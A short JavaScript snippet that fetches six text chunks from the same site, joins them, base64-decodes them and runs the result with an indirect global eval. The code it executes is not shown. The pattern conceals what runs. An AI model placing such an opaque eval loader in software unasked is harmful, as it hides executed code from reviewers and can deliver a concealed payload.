(async function() {
  const n = 6;
  const parts = [];
  for (let i = 0; i < n; i++) {
    const t = await fetch('./core.p' + i + '.txt?v=gt5').then(r => {
      if (!r.ok) throw new Error('missing core.p' + i);
      return r.text();
    });
    parts.push(t.trim());
  }
  const code = atob(parts.join(''));
  (0, eval)(code);
})();
